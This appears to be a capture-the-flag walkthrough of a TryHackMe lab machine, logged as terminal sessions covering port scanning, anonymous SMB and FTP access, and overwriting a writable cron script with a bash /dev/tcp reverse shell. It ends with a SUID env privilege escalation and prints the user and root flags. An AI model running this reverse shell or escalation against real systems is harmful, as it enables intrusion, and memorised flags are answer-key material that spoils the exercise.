# Anonymous

## Naabu

```bash
┌──(ajay㉿ajay)-[~/tryhackme/medium/anonymous]
└─$ naabu -host anonymous.thm -nmap-cli "-A -o nmap" 

                  __
  ___  ___  ___ _/ /  __ __
 / _ \/ _ \/ _ \/ _ \/ // /
/_//_/\_,_/\_,_/_.__/\_,_/

                projectdiscovery.io

[INF] Current naabu version 2.3.5 (latest)
[WRN] UI Dashboard is disabled, Use -dashboard option to enable
[INF] Running CONNECT scan with non root privileges
anonymous.thm:21
anonymous.thm:445
anonymous.thm:139
anonymous.thm:22
[INF] Found 4 ports on host anonymous.thm (10.48.162.210)
[INF] Running nmap command: -A -o nmap -p 139,22,21,445 10.48.162.210
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-04 10:13 CST
Nmap scan report for anonymous.thm (10.48.162.210)
Host is up (0.077s latency).

PORT    STATE    SERVICE     VERSION
21/tcp  open     ftp         vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.129.52
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
22/tcp  filtered ssh
139/tcp open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open     netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: WAP|general purpose
Running: Linux 2.4.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.4.20 cpe:/o:linux:linux_kernel:3.2.0
OS details: Tomato 1.27 - 1.28 (Linux 2.4.20), Linux 3.2.0
Network Distance: 3 hops
Service Info: Host: ANONYMOUS

Host script results:
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2025-11-04T16:14:14+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-11-04T16:14:14
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   257.70 ms 192.168.128.1
2   ...
3   257.94 ms anonymous.thm (10.48.162.210)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.58 seconds

```

## SMB

```bash
┌──(ajay㉿ajay)-[~/tryhackme/medium/anonymous]
└─$ smbclient -N -L anonymous.thm

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        pics            Disk      My SMB Share Directory for Pics
        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            ANONYMOUS
                                                                                                                                                             
┌──(ajay㉿ajay)-[~/tryhackme/medium/anonymous]
└─$ smbclient //anonymuos.thm/pics
do_connect: Connection to anonymuos.thm failed (Error NT_STATUS_UNSUCCESSFUL)
                                                                                                                                                             
┌──(ajay㉿ajay)-[~/tryhackme/medium/anonymous]
└─$ smbclient //anonymous.thm/pics
Password for [WORKGROUP\ajay]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun May 17 06:11:34 2020
  ..                                  D        0  Wed May 13 20:59:10 2020
  corgo2.jpg                          N    42663  Mon May 11 19:43:42 2020
  puppos.jpeg                         N   265188  Mon May 11 19:43:42 2020

                20508240 blocks of size 1024. 13306820 blocks available
smb: \> ls -la
NT_STATUS_NO_SUCH_FILE listing \-la
smb: \> get corgo2.jpg
getting file \corgo2.jpg of size 42663 as corgo2.jpg (60.4 KiloBytes/sec) (average 60.4 KiloBytes/sec)
smb: \> get puppos.jpeg
getting file \puppos.jpeg of size 265188 as puppos.jpeg (330.7 KiloBytes/sec) (average 204.1 KiloBytes/sec)
smb: \> exit
 
```

## FTP

```bash
┌──(ajay㉿ajay)-[~/tryhackme/medium/anonymous]
└─$ ftp anonymous@anonymous.thm
Connected to anonymous.thm.
220 NamelessOne's FTP Server!
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||34048|)
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
ftp> ls -la
229 Entering Extended Passive Mode (|||64661|)
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 May 13  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
ftp> get scripts
local: scripts remote: scripts
229 Entering Extended Passive Mode (|||30665|)
550 Failed to open file.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||10387|)
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1333 Nov 04 16:15 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
ftp> get clean.sh
local: clean.sh remote: clean.sh
229 Entering Extended Passive Mode (|||41643|)
150 Opening BINARY mode data connection for clean.sh (314 bytes).
100% |****************************************************************************************************************|   314        5.34 MiB/s    00:00 ETA
226 Transfer complete.
314 bytes received in 00:00 (10.03 KiB/s)
ftp> get removed_files.log
local: removed_files.log remote: removed_files.log
229 Entering Extended Passive Mode (|||5091|)
150 Opening BINARY mode data connection for removed_files.log (1376 bytes).
100% |****************************************************************************************************************|  1376       20.18 MiB/s    00:00 ETA
226 Transfer complete.
1376 bytes received in 00:00 (46.38 KiB/s)
ftp> get to_do.txt
local: to_do.txt remote: to_do.txt
229 Entering Extended Passive Mode (|||37565|)
150 Opening BINARY mode data connection for to_do.txt (68 bytes).
100% |****************************************************************************************************************|    68        0.70 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.37 KiB/s)
ftp> exit
221 Goodbye.
                        
```

```bash
                                                                                                                                                             
┌──(ajay㉿ajay)-[~/tryhackme/medium/anonymous]
└─$ ls -la
total 328
drwxrwxr-x 2 ajay ajay   4096 Nov  4 10:16 .
drwxrwxr-x 6 ajay ajay   4096 Nov  4 10:05 ..
-rw-rw-r-- 1 ajay ajay    314 Jun  4  2020 clean.sh
-rw-r--r-- 1 ajay ajay  42663 Nov  4 10:11 corgo2.jpg
-rw-rw-r-- 1 ajay ajay   2322 Nov  4 10:14 nmap
-rw-r--r-- 1 ajay ajay 265188 Nov  4 10:11 puppos.jpeg
-rw-rw-r-- 1 ajay ajay   1376 Nov  4 10:16 removed_files.log
-rw-rw-r-- 1 ajay ajay     68 May 11  2020 to_do.txt
                                                                                                                                                             
┌──(ajay㉿ajay)-[~/tryhackme/medium/anonymous]
└─$ cat clean.sh
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
                                                                                                                                                             
┌──(ajay㉿ajay)-[~/tryhackme/medium/anonymous]
└─$ cat to_do.txt 
I really need to disable the anonymous login...it's really not safe
                                                                                                                                                             
┌──(ajay㉿ajay)-[~/tryhackme/medium/anonymous]
└─$ cat removed_files.log 
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete

```

![image.png](/images/anonymous/image.png)

![image.png](/images/anonymous/image1.png)

```bash
┌──(ajay㉿ajay)-[~/tryhackme/medium/anonymous]
└─$ cat clean.sh                                    
#!/bin/bash

bash -i 5<> /dev/tcp/192.168.129.52/1234 0<&5 1>&5 2>&5

```

```bash
ftp> get clean.sh
local: clean.sh remote: clean.sh
229 Entering Extended Passive Mode (|||43380|)
150 Opening BINARY mode data connection for clean.sh (389 bytes).
100% |****************************************************************************************************************|   389        6.18 MiB/s    00:00 ETA
226 Transfer complete.
389 bytes received in 00:00 (1.38 MiB/s)
ftp> 

```

```bash
┌──(ajay㉿ajay)-[~/tryhackme/medium/anonymous]
└─$ nc -lvnp 1234 
listening on [any] 1234 ...
connect to [192.168.129.52] from (UNKNOWN) [10.48.162.210] 37344
bash: cannot set terminal process group (1941): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$ id
id
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
namelessone@anonymous:~$ whoami
whoami
namelessone
namelessone@anonymous:~$ ls
ls
pics
user.txt
namelessone@anonymous:~$ cat user.txt
cat user.txt
90d6f992585815ff991e68748c414740

```

## Privesc

```bash
namelessone@anonymous:~$ sudo -l
sudo -l
[sudo] password for namelessone: 

Sorry, try again.
[sudo] password for namelessone: 

Sorry, try again.
[sudo] password for namelessone: 

sudo: 3 incorrect password attempts
namelessone@anonymous:~$ env
env
LS_COLORS=
LESSCLOSE=/usr/bin/lesspipe %s %s
LANG=en_US.UTF-8
PWD=/home/namelessone
HOME=/home/namelessone
SHELL=/bin/sh
SHLVL=3
LOGNAME=namelessone
PATH=/usr/bin:/bin
LESSOPEN=| /usr/bin/lesspipe %s
_=/usr/bin/env
namelessone@anonymous:~$ /usr/bin/env /bin/sh -p
/usr/bin/env /bin/sh -p
# ls
ls
pics  user.txt
# cat /root/root.txt
cat /root/root.txt
4d930091c31a622a7ed10f27999af363
```